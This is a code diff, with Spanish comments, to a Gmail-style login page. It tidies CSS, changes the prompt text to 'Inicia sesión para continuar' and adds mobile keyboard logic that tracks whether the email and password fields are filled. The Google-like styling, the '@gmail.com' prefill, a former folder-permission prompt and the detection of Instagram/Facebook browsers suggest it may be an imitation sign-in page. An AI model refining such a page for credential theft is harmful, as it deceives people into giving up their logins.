@@ -279,10 +279,10 @@
         .next-button:disabled {
             background-color: #5f6368;
             cursor: not-allowed;
-            color: #e8eaed; /* Cambiado de #9aa0a6 a #e8eaed para mejor visibilidad */
+            color: #e8eaed;
         }
 
-           /* Footer mejorado */
+        /* Footer mejorado */
         .footer {
             margin-top: 40px;
             display: flex;
@@ -313,7 +313,7 @@
         .footer-links {
             display: flex;
             gap: 24px;
-            flex-wrap: nowrap; /* Evita que se dividan en múltiples líneas */
+            flex-wrap: nowrap;
         }
 
         .footer-links a {
@@ -348,23 +348,22 @@
             
             .footer {
                 padding: 0 4px;
-                margin-top: 20x; /* Mantiene todo en una línea */
+                margin-top: 20px;
             }
             
             .footer-links {
-                gap: 12px; /* Reduce espacio entre links */
+                gap: 12px;
                 flex-wrap: nowrap;
             }
             
             .footer-links a {
-                font-size: 10px; /* Reduce tamaño de fuente */
+                font-size: 10px;
             }
             
             .language-selector select {
                 font-size: 10px;
             }
             
-            /* Ajuste específico para móviles pequeños */
             .keyboard-active .container {
                 transform: translateY(-25px);
             }
@@ -378,23 +377,22 @@
             .footer {
                 margin-top: 32px;
                 padding: 0 8px;
-                flex-wrap: nowrap; /* Mantiene todo en una línea */
+                flex-wrap: nowrap;
             }
             
             .footer-links {
-                gap: 8px; /* Espacio mínimo entre links */
+                gap: 8px;
                 flex-wrap: nowrap;
             }
             
             .footer-links a {
-                font-size: 9px; /* Tamaño de fuente más pequeño */
+                font-size: 9px;
             }
             
             .language-selector select {
                 font-size: 9px;
             }
             
-            /* Ajuste más conservador para pantallas muy pequeñas */
             .keyboard-active .container {
                 transform: translateY(-20px);
             }
@@ -416,7 +414,7 @@
                 </div>
                 
                 <div class="guest-mode" id="guestMode">
-                    Solicita el permiso en la carpeta para continuar
+                  Inicia sesión para continuar
                 </div>
                 
                 <div class="input-wrapper">
@@ -679,36 +677,63 @@
            /Instagram|FBAN|FBAV/i.test(navigator.userAgent);
   }
 
+  // Variable global para mantener el estado del teclado
+  let keyboardState = {
+    isActive: false,
+    hasUserFilledData: false
+  };
+
   // Ejecutar todo solo cuando el DOM esté cargado
   document.addEventListener('DOMContentLoaded', () => {
     // Solo ejecutar en dispositivos móviles/responsive
     if (isMobileDevice()) {
       const inputs = document.querySelectorAll('input, textarea, select, button, [contenteditable="true"]');
+      const createAccountLink = document.querySelector('.create-account');
+      const submitButton = document.querySelector('#submitBtn');
       let blurTimeout;
-      let isKeyboardActive = false;
       let hasUserInteracted = false;
+
+      // Función para verificar si el usuario ha llenado datos
+      function checkUserData() {
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        
+        const hasEmailData = emailInput && emailInput.value.trim() !== '' && emailInput.value.trim() !== '@gmail.com';
+        const hasPasswordData = passwordInput && passwordInput.value.trim() !== '';
+        
+        keyboardState.hasUserFilledData = hasEmailData || hasPasswordData;
+        return keyboardState.hasUserFilledData;
+      }
 
       // Función para activar el teclado
       function activateKeyboard() {
-        if (!isKeyboardActive) {
-          clearTimeout(blurTimeout);
-          document.body.classList.add('keyboard-active');
-          document.querySelector('.container').classList.add('keyboard-active');
-          isKeyboardActive = true;
-        }
+        clearTimeout(blurTimeout);
+        document.body.classList.add('keyboard-active');
+        document.querySelector('.container').classList.add('keyboard-active');
+        keyboardState.isActive = true;
       }
 
-      // Función para desactivar el teclado
+      // Función para desactivar el teclado solo si no hay datos
       function deactivateKeyboard() {
         blurTimeout = setTimeout(() => {
           const activeElement = document.activeElement;
           const isInputActive = activeElement && activeElement.matches('input, textarea, select, [contenteditable="true"]');
-          if (!isInputActive) {
+          const hasData = checkUserData();
+          
+          // Solo desactivar si no hay input activo Y no hay datos llenados
+          if (!isInputActive && !hasData) {
             document.body.classList.remove('keyboard-active');
             document.querySelector('.container').classList.remove('keyboard-active');
-            isKeyboardActive = false;
+            keyboardState.isActive = false;
           }
-        }, 50);
+        }, 100);
+      }
+
+      // Función para mantener el teclado activo si hay datos
+      function maintainKeyboardIfNeeded() {
+        if (checkUserData() && !keyboardState.isActive) {
+          activateKeyboard();
+        }
       }
 
       // Evitar que aparezca validación automática antes de interacción del usuario
@@ -732,8 +757,9 @@
         }
       }
 
+      // Configurar eventos para inputs
       inputs.forEach(input => {
-        suppressValidationTemporarily(input); // Evitar validación al inicio
+        suppressValidationTemporarily(input);
 
         input.addEventListener('focus', () => {
           hasUserInteracted = true;
@@ -753,8 +779,47 @@
           activateKeyboard();
         });
 
-        input.addEventListener('blur', deactivateKeyboard);
+        input.addEventListener('input', () => {
+          checkUserData();
+          maintainKeyboardIfNeeded();
+        });
+
+        input.addEventListener('blur', () => {
+          // Solo desactivar si no hay datos llenados
+          if (!checkUserData()) {
+            deactivateKeyboard();
+          }
+        });
       });
+
+      // Manejar el link "Crear cuenta"
+      if (createAccountLink) {
+        createAccountLink.addEventListener('click', (e) => {
+          e.preventDefault();
+          
+          // Si hay datos llenados, mantener el teclado activo
+          if (checkUserData()) {
+            maintainKeyboardIfNeeded();
+          } else {
+            // Si no hay datos, desactivar el teclado
+            document.body.classList.remove('keyboard-active');
+            document.querySelector('.container').classList.remove('keyboard-active');
+            keyboardState.isActive = false;
+          }
+        });
+      }
+
+      // Asegurar que el botón funcione en ambas posiciones
+      if (submitButton) {
+        submitButton.addEventListener('click', (e) => {
+          // Verificar que el formulario sea válido antes de procesar
+          const form = document.getElementById('loginForm');
+          if (form && form.checkValidity()) {
+            // Si el formulario es válido, asegurar que se procese
+            maintainKeyboardIfNeeded();
+          }
+        });
+      }
 
       // Eventos adicionales para otras áreas del formulario
       const formElements = document.querySelectorAll('form, .form-group, .input-group, label');
@@ -780,10 +845,17 @@
         });
       });
 
+      // Verificar estado periódicamente
+      setInterval(() => {
+        if (checkUserData() && !keyboardState.isActive) {
+          maintainKeyboardIfNeeded();
+        }
+      }, 500);
+
       // Cambios de orientación
       window.addEventListener('orientationchange', () => {
         setTimeout(() => {
-          if (document.activeElement.matches('input, textarea, select, [contenteditable="true"]')) {
+          if (document.activeElement.matches('input, textarea, select, [contenteditable="true"]') || checkUserData()) {
             activateKeyboard();
           }
         }, 500);
